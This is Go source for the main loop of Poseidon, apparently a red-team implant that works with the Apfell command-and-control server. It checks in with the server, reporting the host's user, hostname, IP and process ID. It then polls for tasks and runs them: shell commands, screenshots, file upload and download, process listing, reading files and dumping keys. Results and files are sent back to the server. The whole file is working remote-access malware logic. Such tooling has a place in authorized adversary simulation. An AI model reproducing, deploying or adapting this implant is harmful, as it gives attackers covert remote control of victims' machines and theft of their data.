package main

import (
	"C"
	"encoding/json"
	"os"
	"os/user"
	"strings"
	"time"

	"fmt"
	"strconv"

	"github.com/xorrior/poseidon/pkg/commands/cat"
	"github.com/xorrior/poseidon/pkg/commands/keys"
	"github.com/xorrior/poseidon/pkg/commands/ls"
	"github.com/xorrior/poseidon/pkg/commands/ps"
	"github.com/xorrior/poseidon/pkg/commands/screenshot"
	"github.com/xorrior/poseidon/pkg/commands/shell"
	"github.com/xorrior/poseidon/pkg/profiles"
	"github.com/xorrior/poseidon/pkg/utils/functions"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

//export RunMain
func RunMain() {
	main()
}

func main() {

	// Initialize the  agent and check in

	currentUser, _ := user.Current()
	hostname, _ := os.Hostname()
	currIP := functions.GetCurrentIPAddress()
	currPid := os.Getpid()
	// Modify the profile used by changing this line
	// profile := profiles.C2Patchthrough{}
	profile := profiles.C2Default{}
	// profile := profiles.C2Slack{}
	// profile := profiles.C2Websocket{}
	profile.SetUniqueID(profiles.UUID)
	profile.SetURL(profiles.BaseURL)
	profile.SetSleepInterval(profiles.Sleep)
	profile.SetUserAgent(profiles.UserAgent)
	// Evaluate static variables
	if strings.Contains(profiles.ExchangeKeyString, "T") {
		profile.SetXKeys(true)
	} else {
		profile.SetXKeys(false)
	}

	if !strings.Contains(profiles.AesPSK, "PSK_REPLACE") && len(profiles.AesPSK) > 0 {
		profile.SetAesPreSharedKey(profiles.AesPSK)
	} else {
		profile.SetAesPreSharedKey("")
	}

	if len(profiles.HostHeader) > 0 {
		profile.SetHeader(profiles.HostHeader)
	}

	// Checkin with Apfell. If encryption is enabled, the keyx will occur during this process
	resp := profile.CheckIn(currIP, currPid, currentUser.Name, hostname)

	checkIn := resp.(structs.CheckinResponse)
	profile.SetApfellID(checkIn.ID)

	tasktypes := map[string]int{
		"exit":          0,
		"shell":         1,
		"screencapture": 2,
		"keylog":        3,
		"download":      4,
		"upload":        5,
		"inject":        6,
		"ps":            7,
		"sleep":         8,
		"cat":           9,
		"cd":            10,
		"ls":            11,
		"python":        12,
		"jxa":           13,
		"keys":          14,
		"none":          20,
	}

	// Channel used to catch results from tasking threads
	res := make(chan structs.ThreadMsg)
	//if we have an Active apfell session, enter the tasking loop
	if checkIn.Active {
		for {
			time.Sleep(time.Duration(profile.SleepInterval()) * time.Second)

			// Get the next task
			t := profile.GetTasking()
			task := t.(structs.Task)

			switch tasktypes[task.Command] {
			case 0:
				// Throw away the response, we don't really need it for anything
				profile.PostResponse(task, "Exiting")
				os.Exit(0)
				break
			case 1:
				// Run shell command
				go shell.Run(task, res)
				break
			case 2:
				// Capture screenshot
				go screenshot.Run(task, res)
				break
			case 5:
				// File upload
				fileDetails := structs.FileUploadParams{}
				err := json.Unmarshal([]byte(task.Params), &fileDetails)
				if err != nil {
					profile.PostResponse(task, err.Error())
				}

				data := profile.Upload(task, fileDetails.FileID)
				if len(data) > 0 {
					f, e := os.Create(fileDetails.RemotePath)

					if e != nil {
						profile.PostResponse(task, e.Error())
					}

					n, failed := f.Write(data)

					if failed != nil && n == 0 {
						profile.PostResponse(task, failed.Error())
					}

					profile.PostResponse(task, "File upload successful")
				}

				break

			case 4:
				//File download
				profile.Download(task, task.Params)
				break

			case 7:
				go ps.Run(task, res)
				break
			case 8:
				// Sleep
				i, err := strconv.Atoi(task.Params)
				if err != nil {
					profile.PostResponse(task, err.Error())
					break
				}

				profile.SetSleepInterval(i)
				profile.PostResponse(task, "Sleep Updated..")
				break
			case 9:
				//Cat a file
				go cat.Run(task, res)
				break
			case 10:
				//Change cwd
				err := os.Chdir(task.Params)
				if err != nil {
					profile.PostResponse(task, err.Error())
					break
				}

				profile.PostResponse(task, fmt.Sprintf("changed directory to: %s", task.Params))
				break
			case 11:
				//List directory contents
				go ls.Run(task, res)
				break

			case 14:
				go keys.Run(task, res)

			case 20:
				// No tasks, do nothing
				break
			}

			// Listen on the results channel for 1 second
			select {
			case toApfell := <-res:
				if strings.Contains(toApfell.TaskItem.Command, "screencapture") || strings.Contains(toApfell.TaskItem.Command, "download") {
					profile.SendFileChunks(toApfell.TaskItem, toApfell.TaskResult)
				} else {
					profile.PostResponse(toApfell.TaskItem, string(toApfell.TaskResult))
				}

			case <-time.After(1 * time.Second):
				break
			}
		}
	}
}
